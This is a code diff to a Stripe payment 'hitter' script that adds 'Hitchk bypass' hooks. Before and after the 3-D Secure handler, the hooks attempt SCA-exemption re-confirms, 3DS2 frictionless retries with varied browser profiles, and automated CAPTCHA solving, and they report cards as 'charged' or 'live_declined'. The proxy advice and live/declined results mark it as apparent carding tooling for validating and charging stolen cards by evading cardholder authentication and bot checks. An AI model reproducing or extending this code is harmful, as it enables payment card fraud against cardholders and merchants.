@@ -13,6 +13,19 @@ import math
 import numpy as np
 from scipy.interpolate import interp1d
 
+# Hitchk bypass modules (wrap around friend's 3DS code, never replace it)
+try:
+    from stripe_3ds_bypass import (
+        attempt_reconfirm_bypass,
+        attempt_3ds2_frictionless,
+        attempt_3ds2_challenge,
+        attempt_captcha_verification,
+        poll_intent_status,
+    )
+    _HAS_3DS_BYPASS = True
+except ImportError:
+    _HAS_3DS_BYPASS = False
+
 load_dotenv()
 
 # ============= CONFIGURATION =============
@@ -1329,6 +1342,38 @@ class StripeAPIHitter:
                             result['receipt_url'] = receipt_url
                         return result
                     elif status in ['requires_action', 'requires_source_action']:
+                        # === PRE-3DS FAST PATH (Hitchk bypass) ===
+                        # Attempt SCA exemption re-confirms BEFORE friend's 3DS handler.
+                        # If any succeeds, return immediately. Otherwise fall through.
+                        if _HAS_3DS_BYPASS and intent_id and client_secret and not (not is_pi and not is_seti):
+                            _bypass_intent_type = "setup_intent" if is_setup_intent else "payment_intent"
+                            _bypass_headers = {
+                                "User-Agent": profile["user_agent"],
+                                "Content-Type": "application/x-www-form-urlencoded",
+                                "Origin": origin_url,
+                                "Referer": checkout_page_url,
+                                "Accept": "application/json",
+                            }
+                            try:
+                                _bypass_result = await attempt_reconfirm_bypass(
+                                    loop, _cffi_session, self.pk_live,
+                                    intent_id, client_secret, pm_id,
+                                    _bypass_intent_type, _bypass_headers
+                                )
+                                if _bypass_result:
+                                    _bp_status, _bp_msg = _bypass_result
+                                    if _bp_status in ('charged', 'approved'):
+                                        result['success'] = True
+                                        result['decline_code'] = _bp_msg
+                                        return result
+                                    elif _bp_status in ('declined', 'live_declined'):
+                                        result['decline_code'] = _bp_msg
+                                        result['error'] = _bp_msg
+                                        result['raw_response'] = confirm_json
+                                        return result
+                            except Exception as _bp_ex:
+                                print(f"DEBUG: Pre-3DS bypass failed: {_bp_ex}")
+                        # === END PRE-3DS FAST PATH ===
                         try:
                             state = None
                             captcha_triggered = False
@@ -1479,7 +1524,28 @@ class StripeAPIHitter:
                                         state = "3DS Attempt failed"
                                     processed_auth = True
                                 else:
+                                    # === CAPTCHA SOLVER HOOK (Hitchk) ===
                                     if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
+                                        if _HAS_3DS_BYPASS and sdk.get('type') == 'intent_confirmation_challenge':
+                                            try:
+                                                _cap_type = "setup_intent" if is_setup_intent else "payment_intent"
+                                                _cap_result = await attempt_captcha_verification(
+                                                    loop, _cffi_session, self.pk_live,
+                                                    client_secret, intent_id, _cap_type, sdk, headers
+                                                )
+                                                if _cap_result:
+                                                    _cs, _cm = _cap_result
+                                                    if _cs in ('charged', 'approved'):
+                                                        result['success'] = True
+                                                        result['decline_code'] = _cm
+                                                        return result
+                                                    elif _cs in ('declined', 'live_declined'):
+                                                        result['decline_code'] = _cm
+                                                        result['error'] = _cm
+                                                        result['raw_response'] = confirm_json
+                                                        return result
+                                            except Exception as _cap_ex:
+                                                print(f"DEBUG: Captcha solver failed: {_cap_ex}")
                                         result['decline_code'] = 'stripe_captcha_bypass_failed'
                                         result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
                                     else:
@@ -1489,7 +1555,29 @@ class StripeAPIHitter:
                                     return result
 
                                 if processed_auth:
+                                    # === POST-CHALLENGE HOOK (Hitchk) ===
                                     if state == "challenge_required":
+                                        if _HAS_3DS_BYPASS and source:
+                                            try:
+                                                _ch_type = "setup_intent" if is_setup_intent else "payment_intent"
+                                                # Try 3DS2 frictionless with multiple browser variations first
+                                                _fr_result = await attempt_3ds2_frictionless(
+                                                    loop, _cffi_session, self.pk_live,
+                                                    client_secret, intent_id, _ch_type, source, sdk, headers
+                                                )
+                                                if _fr_result:
+                                                    _fs, _fm = _fr_result
+                                                    if _fs in ('charged', 'approved'):
+                                                        result['success'] = True
+                                                        result['decline_code'] = _fm
+                                                        return result
+                                                    elif _fs in ('declined', 'live_declined'):
+                                                        result['decline_code'] = _fm
+                                                        result['error'] = _fm
+                                                        result['raw_response'] = confirm_json
+                                                        return result
+                                            except Exception as _ch_ex:
+                                                print(f"DEBUG: Post-challenge bypass failed: {_ch_ex}")
                                         result['decline_code'] = 'challenge_required'
                                         result['error'] = 'challenge_required'
                                         result['raw_response'] = confirm_json
